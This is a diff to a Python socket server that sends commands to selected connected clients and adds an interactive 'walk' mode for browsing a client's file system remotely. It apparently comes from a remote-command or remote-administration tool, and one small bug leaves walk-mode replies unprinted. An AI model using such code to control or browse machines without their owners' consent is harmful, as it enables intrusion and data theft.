@@ -95,13 +95,21 @@ class Server:
                         self.check_client()
 
                         # passed variable to check if a send failed
-                        passed = 0
+                        passed = False
 
                         for i in self.selection:
                             try:
                                 passed = self.send(self.clients[i - 1][0], cmd[5:])
                                 sleep(1)
-                                passed = self.receive(self.clients[i - 1][0])
+                                msg = self.receive(self.clients[i - 1][0])
+
+                                # If message was received print it
+                                if msg:
+                                    self.print_stuff(content=msg)
+
+                                # If message was not received set passed to 0
+                                else:
+                                    passed = 0
 
                             # if client entry does not exists
                             except IndexError:
@@ -122,8 +130,67 @@ class Server:
             # If you want to browse files for one client
             elif cmd == "walk" and len(self.selection) == 1:
                 i = self.selection[0] - 1
-                print(f"NOW WALKING CLIENT: {socket.gethostbyaddr(self.clients[i][1][0])[0]}\t{self.clients[i][1][0]}:{self.clients[i][1][1]}")
+                print(f"TRYING TO WALK CLIENT: {socket.gethostbyaddr(self.clients[i][1][0])[0]}\t{self.clients[i][1][0]}:{self.clients[i][1][1]}")
 
+                # client object
+                client = self.clients[(self.selection[0] - 1)][0]
+
+                # passed variable to check if a send failed
+                passed = False
+
+                # Message to inform client to activate Walk mode
+                walk_notification = "WALK"
+
+                # Send walk notification
+                passed = self.send(client, walk_notification)
+
+                # If message was send successful
+                if passed:
+                    msg = self.receive(client)
+
+                    # If message receive was successful
+                    if msg:
+                        # Variable to simulate current working directory
+                        path = str(msg) + ">"
+
+                        # few print statements
+                        print("\n")
+                        print(f"NOW WALKING CLIENT: {socket.gethostbyaddr(self.clients[i][1][0])[0]}\t{self.clients[i][1][0]}:{self.clients[i][1][1]}")
+                        print("TYPE STOP TO EXIT WALKING")
+
+                        # Enter main loop
+                        while True:
+                            cmd = input(path)
+
+                            # Send message and create
+                            # Another variable to check if function succeeded
+                            success = self.send(client, cmd)
+
+                            # If send was successful
+                            if success:
+                                # Sleep for one to prevent loss of packages
+                                sleep(1)
+
+                                # Receive answer
+                                success = self.receive(client)
+
+                                if success:
+                                    pass
+
+
+                            # If message send failed set passed to false and break
+                            else:
+                                passed = False
+                                break
+
+                    # If message was not received
+                    else:
+                        passed = False
+
+                # If message send or receive failed check clients again
+                if not passed:
+                    print("WALKING FAILED")
+                    self.check_client()
 
             elif cmd == "help":
                 pass # TODO
@@ -148,9 +215,11 @@ class Server:
             print("Error received")
             return 0
 
-        self.print_stuff(msg.decode())
+        # self.print_stuff(msg.decode())
+        if msg.decode:
+            return msg.decode()
 
-        return 1
+        return 0
 
     def listen(self):
         self.server.listen()
@@ -171,8 +240,7 @@ class Server:
                 # Remove client from list
                 self.clients.remove(client)
 
-
-    def send(self, connection, msg):
+    def send(self, client, msg):
         # Safe length of message
         msg_len = str(len(msg)).encode()
 
@@ -181,10 +249,10 @@ class Server:
 
         try:
             # Send length of message
-            connection.send(msg_len)
+            client.send(msg_len)
 
             #send message
-            connection.send(msg.encode())
+            client.send(msg.encode())
 
         # If sending fails
         except (ConnectionResetError, ConnectionAbortedError):
